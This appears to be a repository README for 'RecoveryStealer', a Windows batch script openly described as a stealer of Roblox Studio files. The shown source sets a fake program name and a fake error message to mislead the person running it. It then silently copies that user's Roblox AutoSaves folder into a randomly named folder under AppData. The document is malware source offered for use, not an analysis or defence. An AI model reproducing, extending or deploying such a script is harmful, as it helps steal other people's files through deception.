# RecoveryStealer
Roblox Studio Files Recovery Stealer.

Author: BonnieRBLX (.bxnnie)

WARNING: RecoveryStealer does not supports cyrillic usernames. Will be fixed soon.
## Requirements 
Windows 10 or higher 
### Source
```batch
@echo off color 0c title %fakename% echo %errorstr% cd %AppData% md AutoSaves%rn% xcopy C:\Users\%user%\Documents\ROBLOX\AutoSaves %AppData%\AutoSaves%rn% timeout /t 2 /nobreak >nul
```
> fakename: variable which is displays program name.
> 
> errorstr: variable which is displays error string.
> 
> rn: random number.
> 
> user: User's name.
> 
